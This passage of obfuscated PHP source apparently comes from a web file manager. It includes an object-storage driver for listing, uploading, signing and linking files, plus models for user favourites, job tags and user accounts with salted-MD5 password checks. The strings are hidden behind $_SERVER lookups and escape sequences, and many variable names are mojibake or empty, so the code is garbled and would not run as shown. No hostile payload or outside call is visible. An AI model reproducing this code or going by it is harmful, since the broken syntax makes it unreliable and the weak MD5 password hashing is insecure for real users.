} foreach ($«û[$»ø∆å[93]] as $∆†⁄ï => $) { $«û[$»ø∆å[93]][$∆†⁄ï] = $this->fileInfo($[$»ø∆å[42]], $Ÿì, $); } return $«û; } protected function infoChildren($÷ú, &$ ™) { $≈ëﬁà =& $_SERVER[]; $€£ = $this->fileList($÷ú, $≈ëﬁà[22], !0); $ ™[$≈ëﬁà[88]] += count($€£[$≈ëﬁà[92]]); $ ™[$≈ëﬁà[87]] += count($€£[$≈ëﬁà[93]]); foreach ($€£[$≈ëﬁà[93]] as $) { if (!$ || !$[$≈ëﬁà[86]]) { continue; } $ ™[$≈ëﬁà[86]] += $[$≈ëﬁà[86]]; } } private function fileInfo($Ïóè, $ = false, $ = array()) { $ÿ£ =& $_SERVER[]; $ = array($ÿ£[42] => $this->pathThis($Ïóè), $ÿ£[94] => $this->getPathOuter($Ïóè), $ÿ£[43] => $ÿ£[224], $ÿ£[185] => $this->ext($Ïóè), $ÿ£[86] => isset($[$ÿ£[86]]) ? $[$ÿ£[86]] : 0); if ($) { return $; } $[$ÿ£[225]] = $[$ÿ£[95]] = 0; $[$ÿ£[226]] = $[$ÿ£[227]] = !0; if (empty($)) { $ = $this->objectMeta($Ïóè); if (!$) { return $; } } if (isset($[$ÿ£[228]]) && $[$ÿ£[228]]) { $[$ÿ£[229]] = $[$ÿ£[228]]; } if (isset($[$ÿ£[204]])) { $[$ÿ£[95]] = $[$ÿ£[204]]; } if (isset($[$ÿ£[86]])) { $[$ÿ£[86]] = $[$ÿ£[86]]; } return $; } private function folderInfo($Óùé, $ = false, $ = array()) { $€É =& $_SERVER[]; $Õµ = array($€É[42] => $this->pathThis($Óùé), $€É[94] => $this->getPathOuter($€É[18] . $Óùé), $€É[43] => $€É[85]); if ($) { return $Õµ; } $Õµ[$€É[225]] = $Õµ[$€É[95]] = 0; $Õµ[$€É[226]] = $Õµ[$€É[227]] = !0; if ($Óùé == $€É[22]) { return $Õµ; } if (empty($)) { $ = $this->objectMeta(trim($Óùé, $€É[18]) . $€É[18]); } if (isset($[$€É[204]])) { $Õµ[$€É[225]] = $[$€É[204]]; } return $Õµ; } private function fileList($, $‹É = '', $ÿã = 0) { $—á =& $_SERVER[]; $«ü√ü = rtrim($, $—á[18]) . $—á[18]; $”ä = $this->listObjs($«ü√ü, null, null, $‹É); if (!$”ä) { return array($—á[92] => array(), $—á[93] => array()); } $◊á = $€° = array(); foreach ($”ä[$—á[230]] as $Àµ) { $Â≤≥ = $Àµ[$—á[42]]; if ($Â≤≥ == $«ü√ü) { continue; } $”û = isset($Àµ[$—á[86]]) ? $Àµ[$—á[86]] : 0; $Î®ñ = $”û == 0 && substr($Â≤≥, strlen($Â≤≥) - 1, 1) == $—á[18] ? !0 : !1; $this->cacheMethodInfoSet($Â≤≥, $Î®ñ, $Àµ); if ($Î®ñ) { $◊á[] = $Â≤≥; continue; } $€°[] = $ÿã ? $Àµ : $Â≤≥; } foreach ($”ä[$—á[231]] as $Àµ) { $◊á[] = $Àµ[$—á[42]]; $this->cacheMethodInfoSet($Àµ[$—á[42]], !0); } $this->cacheMethodInfoSet($, !0); return array($—á[92] => $◊á, $—á[93] => $€°); } private function listObjs($∆ìÕÄ, $ = null, $ = null, $ = null) { $‚¥∂ =& $_SERVER[]; $∆ìÕÄ = trim($∆ìÕÄ, $‚¥∂[18]); $¬∏ = empty($∆ìÕÄ) && $∆ìÕÄ !== $‚¥∂[222] ? $‚¥∂[22] : $∆ìÕÄ . $‚¥∂[18]; return $this->client->getBucket($this->bucket, $¬∏, $, $, $, !0); } public function has($, $Âòç = false, $ = true) { $ËüÇ =& $_SERVER[]; $ = trim($, $ËüÇ[18]); $Ëõù = empty($) && $ !== $ËüÇ[222] ? $ËüÇ[22] : $ . $ËüÇ[18]; $·™ä = null; $ = 500; $”§ = $ËüÇ[18]; $ = $‘ó = array(); while (!0) { $«† = $this->listObjs($, $·™ä, $, $”§); if (!$«†) { break; } $·™ä = $«†[$ËüÇ[232]]; $√ö = $«†[$ËüÇ[230]]; $ = $«†[$ËüÇ[231]]; if (empty($√ö) && empty($)) { break; } if (count($√ö) == 1 && $√ö[0][$ËüÇ[42]] == $Ëõù) { break; } if ($Âòç) { if (count($√ö)) { $√ö = array_column($√ö, $ËüÇ[42]); $ = array_merge($, $√ö); } if (count($)) { $ = array_column($, $ËüÇ[42]); $‘ó = array_merge($‘ó, $); } if ($·™ä === null) { break; } continue; } if ($) { if (!empty($√ö)) { if (count($√ö) > 1 || isset($√ö[0][$ËüÇ[42]]) && $√ö[0][$ËüÇ[42]] != $Ëõù) { return !0; } } } else { if (!empty($)) { return !0; } } if ($·™ä === null) { break; } } if ($Âòç) { $ = array_diff($, array($Ëõù)); $ = count(array_unique($)); $‘ó = count(array_unique($‘ó)); return array($ËüÇ[233] => $, $ËüÇ[234] => $‘ó); } return !1; } public function listAll($⁄ØÍÉû) { $ =& $_SERVER[]; $Œ™–• = $this->fileList($⁄ØÍÉû, $[22], !0); $Àã = array_to_keyvalue($Œ™–•[$[93]], $[42]); foreach ($Œ™–•[$[92]] as $—è) { if (is_string($—è)) { $Àã[$—è] = array($[86] => 0); } } return $this->listAllFiles($⁄ØÍÉû, $Àã); } public function canRead($ƒø) { $ =& $_SERVER[]; $›≠ = $this->client->getAccessControlPolicy($this->bucket, $ƒø); if (!$›≠) { return !1; } return in_array($›≠, array($[235], $[236], $[237])) ? !0 : !1; } public function canWrite($…å) { $Ìë´ =& $_SERVER[]; $…Ä = $this->client->getAccessControlPolicy($this->bucket, $…å); if (!$…Ä) { return !1; } return in_array($…Ä, array($Ìë´[235], $Ìë´[236])) ? !0 : !1; } public function getContent($ﬂ¢) { return $this->client->getObject($this->bucket, $ﬂ¢); } public function setContent($√£, $÷∞ = '', $ = false) { $ÿ´ =& $_SERVER[]; $√£ = $ ? trim($√£, $ÿ´[18]) . $ÿ´[18] : $√£; $ = get_file_mime(get_path_ext($√£)); $€â = $this->client->putObject($÷∞, $this->bucket, $√£, $ÿ´[223], array(), $); if (!$€â) { return !1; } if ($) { return !0; } $this->cacheMethod(null, null); $€â = $this->copyFile($√£, $√£, array($ÿ´[238] => $€â[$ÿ´[228]])); return $€â ? !0 : !1; } public function fileSubstr($‹Å, $–Ä«Ö, $€•) { $ = $–Ä«Ö + $€• - 1; return $this->client->getObject($this->bucket, $‹Å, array($_SERVER[][239] => "\x62\x79\x74\145\x73\75{$–Ä«Ö}\55{$}")); } public function upload($«∫, $Œâ, $ Ñ = false, $ = REPEAT_REPLACE) { $ﬂë =& $_SERVER[]; $Ó¢æ = array($ﬂë[238] => @md5_file($Œâ)); $·ñ¨ = array($ﬂë[240] => get_file_mime(get_path_ext($«∫))); if (IO::size($Œâ) <= 1024 * 1024 * 200) { $”ª = $this->client->putObjectFile($Œâ, $this->bucket, $«∫, $ﬂë[223], $Ó¢æ, $·ñ¨); return !empty($”ª) ? $this->getPathOuter($«∫) : !1; } $ = $this->client->multiUploadObject($Œâ, $this->bucket, trim($«∫, $ﬂë[18]), $Ó¢æ, $·ñ¨); return $ ? $this->getPathOuter($«∫) : !1; } public function download($, $Œé) { if (!@is_dir($this->pathFather($Œé)) && !IO::mkdir($this->pathFather($Œé))) { return !1; } $«ß = $this->client->getObject($this->bucket, $, array(), $Œé); return $«ß !== !1 ? $Œé : !1; } public function link($”ß, $ = array()) { $”ö =& $_SERVER[]; if ($this->signVer == $”ö[241]) { return $this->client->getAuthenticatedURL($this->bucket, $”ß, 3600 * 12, $); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($”ß, $”ö[18]), 3600 * 12, $this->region, array(), !0, $); } public function fileOut($”ô, $ÔÖñ = false, $ = false, $Ê∏Ø = '') { $ =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($”ô, $ÔÖñ, $, $Ê∏Ø); } if (!$) { $ = $this->pathThis($”ô); } $…≠Œ¢ = get_file_mime(get_path_ext($)); if ($…≠Œ¢ == $[242]) { return parent::fileOut($”ô, $ÔÖñ, $, $Ê∏Ø); } $ = array($[243] => $…≠Œ¢); if ($ÔÖñ) { $[$[244]] = $[245] . rawurlencode($); } else { } $ = $this->link($”ô, $); $this->fileOutLink($); } public function fileOutServer($Ãìﬂä, $ÁßÆ = false, $›® = false, $ = '') { parent::fileOut($Ãìﬂä, $ÁßÆ, $›®, $); } public function fileOutImageServer($Àô æ, $ = 250) { parent::fileOutImage($Àô æ, $); } public function hashMd5($ŸÜÃ∑, $≈õ = '') { $ =& $_SERVER[]; $Íâ≠ = $this->objectMeta($ŸÜÃ∑); if (!$Íâ≠) { return !1; } $≈õ = $≈õ ? $≈õ : _get($Íâ≠, $[246]); $≈õ = $≈õ ? $≈õ : _get($Íâ≠, $[228], $[22]); return $≈õ; } public function uploadFormData($ÔÇΩ„§ß, $»∫ = 3600) { $ =& $_SERVER[]; $ = $this->pathFather($ÔÇΩ„§ß); $ = $this->client->getHttpUploadPostParams($this->bucket, $, $[223], $»∫); return array_merge((array) $, array($[206] => $this->getHost())); } public function multiUploadFormData($’ç, $ = 3600) { $ =& $_SERVER[]; $ = gmdate($[247]); $“Å = array(); $Áº• = $this->client->getUploadId($this->bucket, $’ç, $“Å); if (!$Áº•) { return !1; } return array($[248] => $Áº•, $[206] => $this->getHost() . $[18] . $this->pathEncode($’ç), $[249] => $, $[104] => $’ç); } public function multiUploadAuthData($≈Ü, $œ© = array()) { $œû =& $_SERVER[]; $ = isset($œ©[$œû[249]]) ? $œ©[$œû[249]] : gmdate($œû[247]); $¬Ç = isset($œ©[$œû[185]]) ? $œ©[$œû[185]] : $œû[22]; $≈ï = $œ©[$œû[104]]; unset($œ©[$œû[104]]); if (isset($œ©[$œû[250]])) { $œ©[$œû[249]] = $; return $this->listUploadParts($≈ï, $œ©); } $›® = array($œû[251], $œû[22], $œû[130], $œû[22], "\170\x2d\x61\155\x7a\55\144\141\x74\x65\72{$}", $œû[18] . $this->bucket . $œû[18] . $this->pathEncode($≈ï) . $¬Ç); if (strpos($¬Ç, $œû[252]) === 0) { $›®[0] = $œû[253]; } if (isset($œ©[$œû[254]]) && $œ©[$œû[254]] == $œû[255]) { $›®[0] = $œû[255]; } $‘∑ = implode($œû[11], $›®); $·Æ© = base64_encode(hash_hmac($œû[256], $‘∑, $this->secret, !0)); $ = $œû[257] . $this->accessKey . $œû[4] . $·Æ©; if (strpos($¬Ç, $œû[252]) === 0) { return array($œû[258] => $, $œû[249] => $); } return $; } public function listUploadParts($, $ = array()) { $ ¶ =& $_SERVER[]; $ = str_replace($ ¶[259], $ ¶[22], $[$ ¶[185]]); $ = $this->client->listParts($this->bucket, $, $); if (!$) { return !1; } unset($[$ ¶[250]], $[$ ¶[254]]); $[$ ¶[104]] = $; $ = $this->multiUploadAuthData($, $); if (empty($)) { return !1; } return array($ ¶[258] => $, $ ¶[249] => $[$ ¶[249]], $ ¶[260] => $); } public function getHost() { return parent::getHost() . $_SERVER[][18] . $this->bucket; } public function size($’∫) { $ ∫ = $this->objectMeta($’∫); return $ ∫ ? $ ∫[$_SERVER[][86]] : 0; } public function info($Óµ¥) { if ($this->isFolder($Óµ¥)) { return $this->folderInfo($Óµ¥); } else { if ($this->isFile($Óµ¥)) { return $this->fileInfo($Óµ¥); } } return !1; } public function exist($) { return $this->isFile($) || $this->isFolder($); } public function isFile($) { return !$this->isFolder($) && $this->objectMeta($); } public function isFolder($’Ü) { return $this->cacheMethod($_SERVER[][176], $’Ü); } protected function objectMeta($) { return $this->cacheMethod($_SERVER[][178], $); } protected function _objectMeta($ﬂä) { $Ìãó =& $_SERVER[]; $ﬂä = rtrim($ﬂä, $Ìãó[18]); try { $ÿ´ = $this->client->getObjectInfo($this->bucket, $ﬂä); if (!isset($ÿ´[$Ìãó[246]]) && isset($ÿ´[$Ìãó[261]])) { $ÿ´[$Ìãó[246]] = $ÿ´[$Ìãó[261]]; } } catch (Exception $–£) { $ÿ´ = !1; } if (!$ÿ´) { } return $ÿ´; } protected function _isFolder($ Ü) { $ =& $_SERVER[]; $ Ü = rtrim($ Ü, $[18]); if ($ Ü == $[22] || $ Ü == $[18]) { return !0; } $Á¶æ = $this->client->getBucket($this->bucket, $ Ü, null, 1); if (empty($Á¶æ[$[230]])) { return !1; } $Ÿ† = $Á¶æ[$[230]][0][$[42]]; return stripos($Ÿ†, $ Ü . $[18]) === 0 ? !0 : !1; if (substr($Ÿ†, -1) == $[18]) { return !0; } if (get_path_this($Ÿ†) == get_path_this($ Ü)) { return !1; } return !0; } } goto E¬Ö; B‡∂ô: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\146\x61\166"; protected function cacheFunctionAlias($¬ß‘Ä) { $ÃÑ =& $_SERVER[]; return array($ÃÑ[1994] => array(USER_ID, $ÃÑ[2332])); } protected function listData() { $Ûõåö =& $_SERVER[]; $«´ƒØ = array($Ûõåö[1676] => USER_ID, $Ûõåö[534] => 0); $ = $Ûõåö[2333]; $€Ç = $this->field($)->where($«´ƒØ)->order($Ûõåö[2334])->select(); return $€Ç ? $€Ç : array(); } protected function resetCache() { } protected function listView() { $œú =& $_SERVER[]; $ﬂ± = $this->listData(); $ = array_filter_by_field($ﬂ±, $œú[43], $œú[467]); $ = array_to_keyvalue($, $œú[22], $œú[94]); if (!$) { return $ﬂ±; } $ = 2000; $ = array($œú[468] => array($œú[469], $)); $…´ = Model($œú[865])->listSource($, $); $…´ = array_merge($…´[$œú[93]], $…´[$œú[92]]); $…´ = array_to_keyvalue($…´, $œú[191]); foreach ($ﬂ± as $“æ…º => $ﬁ∑⁄≥) { $ÿò = $…´[$ﬁ∑⁄≥[$œú[94]]]; $ÿò = $ÿò ? $ÿò : array(); $ﬂ±[$“æ…º] = array_merge($ÿò, $ﬁ∑⁄≥); } return $ﬂ±; } protected function addFav($⁄É, $⁄≠ = '', $ = "\163\x6f\165\x72\x63\145") { $“∑ =& $_SERVER[]; $Œï = array($“∑[1676] => USER_ID, $“∑[534] => 0, $“∑[473] => $, $“∑[472] => $⁄É); if ($this->where($Œï)->find()) { return !1; } $Œï = array($“∑[1676] => USER_ID, $“∑[534] => 0); $ = $this->where($Œï)->max($“∑[1907]); if (!$) { $ = 0; } if (!$⁄≠ && $ == $“∑[467]) { $Ã© = Model($“∑[1373])->where(array($“∑[468] => $⁄É))->find(); if (!$Ã©) { return !1; } $⁄≠ = $Ã©[$“∑[42]]; } $⁄≠ = $this->getAutoName($⁄≠); $‘ß = array($“∑[1676] => USER_ID, $“∑[534] => 0, $“∑[471] => $⁄≠, $“∑[472] => $⁄É, $“∑[473] => $, $“∑[1887] => $ + 1); return $this->add($‘ß); } protected function remove($·∫™) { $ÿÑ =& $_SERVER[]; $ = array($ÿÑ[1676] => USER_ID, $ÿÑ[470] => $·∫™); return $this->where($)->delete(); } protected function removeByName($‘Ç) { $∆Ö =& $_SERVER[]; $ = array($∆Ö[1676] => USER_ID, $∆Ö[471] => $‘Ç, $∆Ö[534] => 0); return $this->where($)->delete(); } protected function rename($, $) { $Œç =& $_SERVER[]; if ($ == $) { return !1; } $ = $this->getAutoName($); if ($ != $) { return !1; } $ = array($Œç[1676] => USER_ID, $Œç[534] => 0, $Œç[42] => $); return $this->where($)->save(array($Œç[42] => $)); } protected function resetSort($) { $ =& $_SERVER[]; $ = is_array($) ? $ : array(); $‚ùå»£ = array($[1676] => USER_ID); for ($ = 0; $ < count($); $++) { $‚ùå»£[$[470]] = $[$]; $this->where($‚ùå»£)->save(array($[1887] => $ + 1)); } return !0; } protected function moveTop($) { $»∫ =& $_SERVER[]; $ﬂ£ = array($»∫[1676] => USER_ID, $»∫[534] => 0); $€Ñ—´ = $this->where($ﬂ£)->where(array($»∫[42] => $))->find(); if (!$€Ñ—´) { return; } $Ëü∂√¨ = $this->field($»∫[452])->where($ﬂ£)->order($»∫[2334])->select(); $Ëü∂√¨ = array_to_keyvalue($Ëü∂√¨, $»∫[22], $»∫[452]); $…ü = $Ëü∂√¨; $Ëü∂√¨ = array_remove_value($Ëü∂√¨, $€Ñ—´[$»∫[452]]); array_unshift($Ëü∂√¨, $€Ñ—´[$»∫[452]]); return $this->resetSort($Ëü∂√¨); } protected function moveBottom($”µ√ä) { $Ãç =& $_SERVER[]; $—µ = array($Ãç[1676] => USER_ID, $Ãç[534] => 0); $ = $this->where($—µ)->max($Ãç[1907]); $ = array($Ãç[1907] => $ + 1); return $this->where($—µ)->where(array($Ãç[42] => $”µ√ä))->save($); } private function getAutoName($¬Ω) { $ =& $_SERVER[]; $Ÿ¥ = array($[1676] => USER_ID, $[534] => 0); $—© = $this->field($[42])->where($Ÿ¥)->select(); $—© = array_to_keyvalue($—©, $[22], $[42]); if (!$—© || !in_array($¬Ω, $—©)) { return $¬Ω; } for ($Ã® = 0; $Ã® < count($—©); $Ã®++) { if (!in_array($¬Ω . "\50{$Ã®}\x29", $—©)) { return $¬Ω . "\x28{$Ã®}\x29"; } } return $¬Ω . "\50{$Ã®}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\x6a\x6f\142\114\151\163\164"; public $field = array("\x6e\x61\155\x65", "\x64\x65\x73\143", "\x73\x6f\162\x74"); const JOB_KEY = "\x73\x65\154\146\112\x6f\142\x4c\151\163\164"; public function listData($ = false, $Íµπ = "\x73\x6f\162\164", $ = false) { return parent::listData($, $Íµπ, $); } public function remove($«¶) { return parent::remove($«¶); } public function add($Àâ‚¥°) { $÷ã =& $_SERVER[]; if ($this->findByName($Àâ‚¥°[$÷ã[42]])) { return !1; } $Àâ‚¥°[$÷ã[1907]] = $this->getSort(); return parent::insert($Àâ‚¥°); } private function getSort() { $›∂ =& $_SERVER[]; $ = parent::listData(); $ƒÉ‹ö = array_to_keyvalue($, $›∂[22], $›∂[1907]); return empty($ƒÉ‹ö) ? 0 : max($ƒÉ‹ö) + 1; } public function update($«™, $◊©‰åÆ) { $Õ† =& $_SERVER[]; $ = parent::listData($«™); $·äöÕ± = $this->findByName($◊©‰åÆ[$Õ†[42]]); if (!$ || $·äöÕ± && $·äöÕ±[$Õ†[452]] != $[$Õ†[452]]) { return !1; } return parent::update($«™, $◊©‰åÆ); } public function setUserJob($Œø⁄î, $) { $ÛÆÑ° =& $_SERVER[]; if (!is_array($)) { $ = array($); } $«Ñ = parent::listData(); $Â∑ï = array_to_keyvalue($«Ñ, $ÛÆÑ°[42]); $ = $ÛÆÑ°[431]; foreach ($ as $œÑ) { if ($Â∑ï[$œÑ]) { $ .= $Â∑ï[$œÑ][$ÛÆÑ°[452]] . $ÛÆÑ°[60]; } else { $«° = $this->add($œÑ); $ .= $«° . $ÛÆÑ°[60]; } } $ = rtrim($, $ÛÆÑ°[60]); Model($ÛÆÑ°[576])->metaSet($Œø⁄î, self::JOB_KEY, $); } public function getUserJob($) { $‹Å = Model($_SERVER[][576])->metaGet($); return $this->getUserJobInfo($‹Å[self::JOB_KEY]); } public function getUserJobInfo($) { $–ß =& $_SERVER[]; $ŒÖ…® = explode($–ß[60], $); $ËÇÄ = parent::listData(); $ËÇÄ = array_remove_key($ËÇÄ, $–ß[225]); $ÔöÇ = array(); foreach ($ŒÖ…® as $) { if (isset($ËÇÄ[$])) { $ÔöÇ[] = $ËÇÄ[$]; } } return $ÔöÇ; } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\162"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\x6d\x65" => "\165\163\x65\x72\x5f\155\145\x74\141", "\155\145\164\141\106\151\x65\x6c\144" => "\165\x73\145\x72\x49\x44"); protected $simpleField = "\165\x73\x65\x72\111\x44\54\x6e\x69\x63\x6b\x4e\x61\x6d\x65\x2c\156\x61\155\145\54\141\x76\141\164\x61\162\54\x73\x65\170\x2c\163\164\x61\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($) { $ÿó =& $_SERVER[]; $ŒÅ = $ÿó[2335]; return array($ÿó[1961] => array($[0], $ŒÅ), $ÿó[1963] => array($[0], $ŒÅ), $ÿó[2336] => array($[0], $ŒÅ)); } protected function getInfo($‹ì, $–Æ = false) { $⁄í = $this->getInfoSimple($‹ì); if (!is_array($⁄í)) { return array(); } if ($–Æ) { return $this->_getInfoApply($⁄í); } return $this->cacheFunctionGet($_SERVER[][1965], $‹ì); } protected function getInfoFull($∆í, $ = false) { $ = $this->getInfoSimple($∆í); if (!is_array($)) { return array(); } if ($) { return $this->_getInfoApply($, !0); } return $this->cacheFunctionGet($_SERVER[][2337], $∆í); } private function _getInfoApply($, $‚ôñ = false) { $ÿ≥ =& $_SERVER[]; if (!$) { return $; } $ = md5($ÿ≥[2338] . $[$ÿ≥[930]] . $ÿ≥[2339] . $[$ÿ≥[42]]); $ = $this->_listDataApplyItem($); $…ü = Model($ÿ≥[1373])->metaGet($[$ÿ≥[97]][$ÿ≥[191]]); $[$ÿ≥[2340]] = $; $[$ÿ≥[97]][$ÿ≥[2157]] = isset($…ü[$ÿ≥[2158]]) ? $…ü[$ÿ≥[2158]] : null; if ($‚ôñ) { $[$ÿ≥[516]] = $this->metaGet($[$ÿ≥[1685]]); } return $; } protected function getInfoSimple($, $‚áü = false) { $ =& $_SERVER[]; if (!$) { return array(); } if ($‚áü) { $ = $this->where(array($[1685] => intval($)))->find(); if (!is_array($)) { return array(); } $[$[2341]] = Action($[2342])->parseUrl($[$[2341]]); return $; } return $this->cacheFunctionGet($[1966], $); } protected function getInfoSimpleOuter($) { $Ó∞à =& $_SERVER[]; if (!$ || $ == 0) { return array($Ó∞à[1685] => $Ó∞à[222], $Ó∞à[42] => $Ó∞à[173] . LNG($Ó∞à[2343]) . $Ó∞à[175], $Ó∞à[2341] => STATIC_PATH . $Ó∞à[2344]); } $ = $this->cacheFunctionGet($Ó∞à[1966], $); $ ò = array_field_key($, explode($Ó∞à[60], $this->simpleField)); if (!$ ò) { return array($Ó∞à[1685] => $Ó∞à[1229], $Ó∞à[42] => $Ó∞à[173] . LNG($Ó∞à[2345]) . $Ó∞à[175], $Ó∞à[2341] => STATIC_PATH . $Ó∞à[2346]); } $ ò[$Ó∞à[2341]] = Action($Ó∞à[2342])->parseUrl($ ò[$Ó∞à[2341]]); return $ ò; } protected function groupUser($) { } public static function errorLang($—´ ¶) { $€ô =& $_SERVER[]; $»Ü = array(self::ERROR_USER_NOT_EXISTS => $€ô[2347], self::ERROR_USER_PASSWORD_ERROR => $€ô[2348], self::ERROR_USER_EXIST_NAME => $€ô[2349], self::ERROR_USER_EXIST_PHONE => $€ô[2350], self::ERROR_USER_EXIST_EMAIL => $€ô[2351], self::ERROR_USER_LOGIN_LOCK => $€ô[2352], self::ERROR_IP_NOT_ALLOW => $€ô[2353], self::ERROR_USER_EXIST_NICKNAME => $€ô[2354]); return LNG($»Ü[$—´ ¶]); } public function getInfoByMeta($, $ÀÆ) { $ =& $_SERVER[]; $ = Model($[2355])->where(array($[104] => $, $[427] => $ÀÆ))->find(); if ($) { return $this->getInfo($[$[1685]]); } return !1; } public function userLoginCheck($, $) { $»§ =& $_SERVER[]; $∆∫∆± = $this->userLoginFind($); if (!$∆∫∆±) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($∆∫∆±[$»§[1685]], $)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($∆∫∆±[$»§[1685]]); } public function userLoginFind($) { $‘Éﬂû =& $_SERVER[]; $◊° = array($‘Éﬂû[42] => $, $‘Éﬂû[2165] => $, $‘Éﬂû[358] => $, $‘Éﬂû[2356] => $, $‘Éﬂû[1041] => $‘Éﬂû[1043]); if ($this->nickNameRpt()) { unset($◊°[$‘Éﬂû[2165]]); } return $this->where($◊°)->find(); } public function clearCache($Ú®üÑ) { $ =& $_SERVER[]; $this->cacheFunctionClear($[1965], $Ú®üÑ); $this->cacheFunctionClear($[1966], $Ú®üÑ); $this->cacheFunctionClear($[2337], $Ú®üÑ); } public function userPasswordCheck($„°ñ, $) { $‹Å =& $_SERVER[]; $ = $this->where(array($‹Å[1685] => intval($„°ñ)))->find(); $ = $this->metaGet($„°ñ); $÷í = isset($[$‹Å[2357]]) ? $[$‹Å[2357]] : $‹Å[22]; if (md5($÷í . trim($)) !== $[$‹Å[930]]) { return !1; } return !0; } public function userAdd($) { $»ë =& $_SERVER[]; $Áî¥ = array($»ë[471] => $[$»ë[42]], $»ë[2358] => $[$»ë[1561]], $»ë[2359] => isset($[$»ë[358]]) ? $[$»ë[358]] : $»ë[22], $»ë[2360] => isset($[$»ë[2356]]) ? $[$»ë[2356]] : $»ë[22], $»ë[2361] => isset($[$»ë[2165]]) ? $[$»ë[2165]] : $[$»ë[42]], $»ë[2362] => isset($[$»ë[2341]]) ? $[$»ë[2341]] : $»ë[22], $»ë[2363] => isset($[$»ë[2364]]) ? $[$»ë[2364]] : 1, $»ë[2365] => $[$»ë[930]], $»ë[1967] => isset($[$»ë[1870]]) ? $[$»ë[1870]] : 1024 * 1024 * 20, $»ë[1968] => 0, $»ë[2366] => 0, $»ë[2012] => isset($[$»ë[790]]) ? $[$»ë[790]] : 1); if (!empty($[$»ë[1685]])) { $Áî¥[$»ë[1685]] = $[$»ë[1685]]; } $÷í = $this->_checkExist($); if ($÷í !== !0) { return $÷í; } if (!empty($Áî¥[$»ë[2341]]) && strlen($Áî¥[$»ë[2341]]) > 255) { $Áî¥[$»ë[2341]] = $»ë[22]; } $»û¬ø = $this->add($Áî¥); $ = array($»ë[2365] => $Áî¥[$»ë[930]], $»ë[2361] => $Áî¥[$»ë[2165]]); $this->userEdit($»û¬ø, $); Model($»ë[1373])->userRootAdd($»û¬ø); return $»û¬ø; } protected function userEditTest($√™, $¬ï) { return $this->call($_SERVER[][2367], $√™, $¬ï); } protected function userEdit($÷á, $ÌÅ¢) { $ =& $_SERVER[]; $ = $this->getInfoSimple($÷á); if (!$) { return !1; } $ = $this->_checkExist($ÌÅ¢, $÷á); if ($ !== !0) { return $; } if (isset($ÌÅ¢[$[930]]) && trim($ÌÅ¢[$[930]]) != $[22]) { $ = $this->metaGet($÷á); if (empty($[$[2357]])) { $[$[2357]] = rand_string(10); Model($[555])->metaSet($÷á, $[2357], $[$[2357]]); } $ÌÅ¢[$[930]] = md5($[$[2357]] . trim($ÌÅ¢[$[930]])); } else { unset($ÌÅ¢[$[930]]); } if (!empty($ÌÅ¢[$[2341]]) && strlen($ÌÅ¢[$[2341]]) > 255) { $ÌÅ¢[$[2341]] = $[22]; } $this->where(array($[1676] => $÷á))->save($ÌÅ¢); if (isset($ÌÅ¢[$[2165]])) { $this->setNamePinyin($÷á, $ÌÅ¢[$[2165]]); } $this->clearCache($÷á); return !0; } public function setNamePinyin($ÿ¥, $Ÿí = false) { $ =& $_SERVER[]; if (!$Ÿí) { $ = $this->getInfoSimple($ÿ¥); $Ÿí = $[$[2165]] ? $[$[2165]] : $[$[42]]; } $ = Model($[576]); if (!Input::check($Ÿí, $[632])) { return $->metaSet($ÿ¥, array($[515] => $[22], $[514] => $[22])); } return $->metaSet($ÿ¥, array($[515] => str_replace($[63], $[22], Pinyin::get($Ÿí)), $[514] => Pinyin::get($Ÿí, $[633]))); } private function nickNameRpt() { $„∏© =& $_SERVER[]; $ = Model($„∏©[810])->get($„∏©[2368]); $ Å = $GLOBALS[$„∏©[16]][$„∏©[434]][$„∏©[2368]]; $ÿö = !is_null($) ? $ : $ Å; return !!$ÿö; } private function _checkExist($‰î¶, $Ÿ§ = false) { $ =& $_SERVER[]; $„óé = array($[42] => UserModel::ERROR_USER_EXIST_NAME, $[2165] => UserModel::ERROR_USER_EXIST_NICKNAME, $[358] => UserModel::ERROR_USER_EXIST_EMAIL, $[2356] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($„óé[$[2165]]); } $ÿ∫ = $Ÿ§ ? array($[1685] => array($[2369], $Ÿ§)) : array(); foreach ($„óé as $ﬁ¨ => $) { $ = array(); foreach ($„óé as $ => $“µ) { if (isset($‰î¶[$]) && $‰î¶[$]) { $[] = $‰î¶[$]; } } if (!$) { continue; } $◊Ø⁄º = array_merge(array($ﬁ¨ => array($[17], $)), $ÿ∫); $€î = $this->where($◊Ø⁄º)->find(); if ($€î) { return $; } } return !0; } public function userListInfo($’ë) { $ŸÖ =& $_SERVER[]; $‘ç = array(); $’ë = is_array($’ë) ? array_unique($’ë) : array(); if (!$’ë) { return $‘ç; } if (count($’ë) < 20) { foreach ($’ë as $‘ï) { $‘ç[$‘ï . $ŸÖ[22]] = $this->getInfoSimpleOuter($‘ï); } } else { $ŒÑ = array($ŸÖ[1676] => array($ŸÖ[469], $’ë)); if (count($’ë) == 1) { $ŒÑ = array($ŸÖ[1676] => $’ë[0]); } $ = Model($ŸÖ[555])->field($this->simpleField)->where($ŒÑ)->select(); $ = array_to_keyvalue($, $ŸÖ[1685]); foreach ($’ë as $‘ï) { $ = $[$‘ï]; if (!$) { $‘ç[$‘ï . $ŸÖ[22]] = $this->getInfoSimpleOuter($‘ï); continue; } $[$ŸÖ[2341]] = Action($ŸÖ[2342])->parseUrl($[$ŸÖ[2341]]); $‘ç[$‘ï . $ŸÖ[22]] = $; } } return $‘ç; } protected function userStatus($»≤, $) { $€† = $this->getInfoSimple($»≤); if (!$€†) { return !1; } $ = array($_SERVER[][790] => $); return $this->userEdit($»≤, $); } protected function userRemove($) { $ =& $_SERVER[]; $Ÿä = $this->getInfoSimple($); 